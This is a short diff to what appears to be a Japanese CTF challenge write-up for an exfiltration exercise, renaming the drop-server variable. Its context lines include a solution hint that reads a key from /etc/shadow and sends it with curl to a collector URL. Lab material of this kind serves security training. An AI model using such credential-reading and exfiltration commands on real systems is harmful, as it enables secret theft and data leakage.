@@ -42,7 +42,7 @@ CTF Company の **master key** にようやく手が届いた。だが「読む�
 受け付けないので、そもそも reverse shell では 1 バイトも届かない。
 
   collector(drop server):
-    ${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil
+    ${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil
   payload (JSON):
     {"user":"${FALCO_CTF_USER}","flag":"FALCO{...}"}
 
@@ -89,7 +89,7 @@ HINT 3 (解答): 読む → curl で exfil → 30 秒 → submit
   FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
 
   # 2) 既存 curl で collector へ静かに持ち出す
-  curl -s "${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil" \
+  curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
     -H 'Content-Type: application/json' \
     -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
 
